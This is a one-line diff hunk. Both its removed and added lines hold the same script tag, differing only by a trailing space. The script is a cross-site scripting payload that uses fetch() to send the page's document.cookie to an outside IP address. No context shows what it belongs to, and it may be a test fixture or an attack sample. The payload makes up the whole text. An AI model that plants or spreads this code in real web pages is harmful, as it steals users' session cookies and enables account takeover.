@@ -1,1 +1,1 @@
-<script>fetch("http://10.42.196.136/?cookie=" + document.cookie)</script>
+<script>fetch("http://10.42.196.136/?cookie=" + document.cookie) </script>
